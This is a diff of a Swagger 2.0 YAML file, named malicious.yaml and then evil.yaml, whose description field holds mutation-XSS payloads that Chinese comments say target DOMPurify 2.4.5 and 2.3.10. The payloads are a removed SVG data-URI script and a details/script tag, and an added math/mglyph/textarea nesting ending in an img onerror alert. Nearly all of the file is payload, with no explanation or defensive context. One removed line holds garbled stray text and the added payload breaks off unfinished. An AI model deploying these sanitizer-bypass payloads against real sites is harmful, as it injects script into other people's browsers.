@@ -1,9 +1,13 @@
-# malicious.yaml
+# evil.yaml
 swagger: "2.0"
 info:
   description: |
-    <!-- 针对 DOMPurify 2.4.5 的 mutation XSS -->
-    <svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.domain)</script></svggraceful degradation#x"></use></svg>
-    <!-- 或 -->
-    <details open><summary></summary><script>alert(1)</script></details>
-paths: {}
+    <!-- 针对 DOMPurify 2.3.10 的经典 mXSS -->
+    <math>
+      <mtext>
+        <option><FAKEFAKE><option></option>
+        <mglyph>
+          <svg>
+            <mtext>
+              <textarea>
+                <a title="</textarea><img src=x onerror=alert(document.domain)>">
